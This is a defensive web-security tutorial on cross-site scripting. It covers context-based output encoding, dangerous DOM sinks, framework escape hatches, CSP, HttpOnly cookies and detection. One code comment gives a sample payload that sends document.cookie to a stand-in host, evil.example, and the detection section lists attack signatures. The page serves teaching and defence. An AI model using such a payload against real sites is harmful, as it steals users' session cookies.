---
title: Cross-site scripting
description: Why XSS is an output problem, not an input problem, and how context decides the encoding.
sources:
  - title: OWASP Cross Site Scripting Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
    author: OWASP
  - title: 'CWE-79 — Improper Neutralization of Input During Web Page Generation'
    url: https://cwe.mitre.org/data/definitions/79.html
    author: MITRE
  - title: PortSwigger — Cross-site scripting
    url: https://portswigger.net/web-security/cross-site-scripting
  - title: 'Trusted Types — W3C specification'
    url: https://w3c.github.io/trusted-types/dist/spec/
    author: W3C
  - title: OWASP WSTG v4.2 — Testing for XSS
    url: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
furtherReading:
  - title: 'CWE-116 — Improper Encoding or Escaping of Output'
    url: https://cwe.mitre.org/data/definitions/116.html
---

## The mechanism

The browser receives a document and parses it into HTML, then executes scripts. If user input
lands in that document unencoded, the parser treats it as markup or code.

```html
<!-- VULNERABLE: reflected into HTML body -->
<p>Hello, <?= $_GET['name'] ?></p>
<!-- name = <img src=x onerror="fetch('//evil.example/'+document.cookie)"> -->

<!-- FIXED: HTML-encode at the point of output -->
<p>Hello, <?= htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') ?></p>
```

The defect is at **output**, not input. This is why input filters are the wrong layer: the same
string may be safe in one context and dangerous in another.

## Three types

| Type | Where the payload lives | Who is attacked |
| --- | --- | --- |
| Reflected | In the request, echoed in the response | Whoever clicks the crafted link |
| Stored | Persisted, served to others later | Every viewer of the page |
| DOM-based | Never reaches the server; a client script sinks it | Whoever runs the page |

Stored XSS in an admin panel is the highest-impact variant, because the victim has the most
privilege.

## Context is everything

The correct encoding depends on where the value lands:

| Context | Encoding / approach |
| --- | --- |
| HTML text | `&lt; &gt; &amp; &quot; &#x27;` |
| HTML attribute | Attribute-encode; quote attributes |
| URL parameter | `encodeURIComponent`, validate scheme |
| JavaScript string | JSON-encode, do not interpolate |
| CSS | Avoid; use allow-listed values |
| HTML comment | Do not put data there |

```javascript
// VULNERABLE: string building into HTML
el.innerHTML = '<span>' + userInput + '</span>';

// FIXED: text node, never parsed as markup
el.textContent = userInput;

// FIXED alternative: a safe templating layer that escapes by default
```

## Dangerous sinks

Client-side XSS lives in the gap between a source and a sink:

```javascript
// Sources: location.*, document.referrer, postMessage, storage
// Sinks to avoid with untrusted data:
element.innerHTML = data;
element.outerHTML = data;
document.write(data);
eval(data);
new Function(data);
setTimeout(data, 0);        // string form
location.href = data;       // javascript: URL
```

Frameworks escape by default when you use their binding syntax. They stop protecting you the
moment you use an escape hatch:

```jsx
// Safe: React escapes this
return <p>{userInput}</p>;

// Unsafe: escape hatch, no protection
return <p dangerouslySetInnerHTML={{ __html: userInput }} />;
```

Vue's `v-html`, Angular's `bypassSecurityTrust*`, and Svelte's `{@html}` are the same hatch.

## CSP is a mitigation, not a fix

Content-Security-Policy limits what injected script can do:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<random>'; object-src 'none'; base-uri 'none'
```

- It does **not** stop injection.
- It does stop inline script execution, so the payload fails silently.
- `unsafe-inline` and wildcard sources defeat most of its value.
- Reporting (`report-to`) tells you when something tried, which is detection value.

Trusted Types goes further: it makes DOM sinks reject raw strings at runtime, which turns XSS
into a type error in development.

## Cookies and impact

A session cookie with `HttpOnly` cannot be read by injected script, which downgrades XSS from
"account takeover" to "act as the user in the page". That is still serious: the script can
make authenticated requests, read the DOM, and exfiltrate what is displayed.

```http
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
```

## Detection

In logs and telemetry:

- Requests containing `<script`, `onerror=`, `javascript:`, or encoded equivalents in parameters.
- CSP violation reports suddenly appearing from one page.
- WAF blocks clustering on one endpoint.
- In the browser: an unexpected script origin in the network panel.

For stored XSS, the first evidence is usually a user report, not a signature. That is why
output encoding has to be a default in the template layer rather than a review checklist item.

## Exercise (local only)

1. In a lab app you control, add a comment feature that reflects input into HTML. Confirm the
   payload executes.
2. Fix it with context-appropriate encoding, then confirm the payload renders as text.
3. Add a strict CSP and confirm the payload is blocked even if encoding regresses.
4. Repeat for an attribute context and a JavaScript string context. Note which fix differs.

The last step is the point: "escape the input" is not a technique. "Encode for the context at
the sink" is.
